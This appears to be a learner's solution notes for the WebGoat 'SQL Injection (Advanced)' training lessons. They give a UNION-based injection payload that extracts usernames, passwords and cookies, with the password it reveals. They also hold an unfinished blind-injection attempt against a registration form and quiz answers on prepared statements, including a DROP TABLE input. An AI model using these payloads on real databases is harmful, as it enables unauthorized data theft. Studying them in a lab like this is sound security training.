# SQL Injection (Advanced)

## 3 - Try It! Pulling Data from Other Table

'user_data' table
```
CREATE TABLE user_data (userid int not null,
                        first_name varchar(20),
                        last_name varchar(20),
                        cc_number varchar(30),
                        cc_type varchar(10),
                        cookie varchar(20),
                        login_count int);
```

'user_system_data'
```
CREATE TABLE user_system_data (userid int not null primary key,
			                   user_name varchar(12),
			                   password varchar(10),
			                   cookie varchar(30));
```

Question
6.a) Retrieve all data from the table
6.b) When you have figured it out…​. What is Dave’s password?

Answer:
6. a)Name =
```
' OR '1' = '1' UNION select userid, user_name as first_name, password as last_name, cookie, '1' as cc_number, '2' as cc_type, 3 as login_count from user_system_data where '1' = '1
```

6. b) Password = `passW0rD`

## 5 - Can You Login as Tom? // TODO

Steps:
1. In Register page, use this value.
```
Username=tom
Email Address=tom@webgoat.com
Password=password
Confirm Password=password
```

2. The result is "User tom already exists please try to register with a different username."

3. Assuming that username is injectable.
```
Username = ' UNION SELECT table_name FROM all_tables; --
```

Username = tom' AND '1'='2
Result = User tom' AND '1'='2 created, please proceed to the login page.

Username = tom' AND '1'='1
Result = User {0} already exists please try to register with a different username.

Username = tom' AND '1'='1' UNION SELECT table_name FROM all_tables; --
Result = Something went wrong

-- ORACLE database?
Username = tom' AND '1'='1' UNION SELECT table_name FROM all_tables where '1' = '1
Result = Something went wrong

-- MYSQL database?
Username = tom' AND '1'='1' UNION SELECT table_name FROM information_schema.tables; --
Result = User {0} already exists please try to register with a different username.

Username = ' AND '1'='1' UNION SELECT table_name FROM information_schema.tables; --
Result = User ' AND '1'='1' UNION SELECT table_name FROM information_schema.tables; -- already exists please try to register with a different username.

Username = ' AND '


Login Page
Username=tom
Password=' OR '1' = '1

' AND 1=2 UNION SELECT owner, table_name, 1 FROM all_tables; --

Register Page
Username=tom
Email Address=tom@webgoat.com
Password=password
Confirm Password=password


## 6 - Quiz
1. What is the difference between a prepared statement and a statement?
Answer:Solution 4: A statement has got values instead of a prepared statement

2. Which one of the following characters is a placeholder for variables?
Answer: Solution 3: ?

3. How can prepared statements be faster than statements?
Solution 2: Prepared statements are compiled once by the database management system waiting for input and are pre-compiled this way.

4. How can a prepared statement prevent SQL-Injection?
Answer: Solution 3: Placeholders can prevent that the users input gets attached to the SQL query resulting in a seperation of code and data.

5. What happens if a person with malicious intent writes into a register form :Robert); DROP TABLE Students;-- that has a prepared statement?
Answer: Solution 4: The database registers 'Robert' ); DROP TABLE Students;--'.

